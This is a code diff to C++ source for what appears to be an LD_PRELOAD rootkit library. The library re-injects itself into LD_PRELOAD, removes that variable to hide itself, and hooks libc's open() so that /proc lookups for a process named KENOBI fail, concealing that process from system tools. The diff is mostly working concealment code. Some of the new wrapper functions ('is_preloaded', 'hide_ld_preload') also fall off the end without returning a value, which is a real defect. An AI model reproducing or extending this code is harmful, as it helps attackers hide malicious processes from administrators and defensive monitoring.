@@ -73,18 +73,42 @@ void export_ld_preload() {
 	}
 }
 
-void add_self_preload() {
+void _add_self_preload() {
 	export_ld_preload();
 	// TODO выяснить почему не работает первый вызов
 	export_ld_preload();
 }
 
-bool is_preloaded() {
+void add_self_preload() noexcept {
+	try {
+		_add_self_preload();
+	} catch (...) {
+		return;
+	}
+}
+
+bool _is_preloaded() {
 	return current_preload_path() == current_so_path();
 }
 
-void hide_ld_preload() {
+bool is_preloaded() noexcept {
+	try {
+		_is_preloaded();
+	} catch (...) {
+		return false;
+	}
+}
+
+void _hide_ld_preload() {
 	unsetenv(LD_PRELOAD);
+}
+
+bool hide_ld_preload() noexcept {
+	try {
+		_hide_ld_preload();
+	} catch (...) {
+		return false;
+	}
 }
 
 pid_t to_pid(const std::string& path) {
@@ -101,28 +125,29 @@ pid_t to_pid(const std::string& path) {
 
 std::string proc_name(const pid_t pid) {
 	static const fs::path PROC{"/proc"};
-	std::ifstream stat{PROC / std::to_string(pid) / "stat"s};
+	std::ifstream stat{PROC / std::to_string(pid) / "status"s};
 	if (!stat) {
 		return "";
 	}
-	std::string stat_line{};
-	std::getline(stat, stat_line);
-
-	static const std::regex pn_regex{".*\\((.*)\\).*"};
-	std::smatch pn_match{};
-	if (!std::regex_match(stat_line, pn_match, pn_regex)) {
-		return "";
+	std::string tmp{};
+	std::string name{};
+	if (stat >> tmp >> name) {
+		return name;
 	}
-	return pn_match[1];
+	return "";
 }
 
-bool is_hiden(const fs::path& target) {
+bool _is_hiden(const fs::path& target) {
+	const auto pid = to_pid(fs::canonical(target).generic_string());
+	if (!pid) {
+		return false;
+	}
+	return proc_name(pid) == KENOBI;
+}
+
+bool is_hiden(const char *pathname) noexcept {
 	try {
-		const auto pid = to_pid(fs::canonical(target).generic_string());
-		if (!pid) {
-			return false;
-		}
-		return proc_name(pid) == KENOBI;
+		return _is_hiden(fs::path{pathname});
 	} catch (...) {
 		return false;
 	}
@@ -156,7 +181,7 @@ int open (const char *pathname, int flags, ...){
 	va_list args;
 	mode_t mode{};
 
-	if (is_hiden(fs::path(pathname))) {
+	if (is_hiden(pathname)) {
 		return -1;
 	}
 
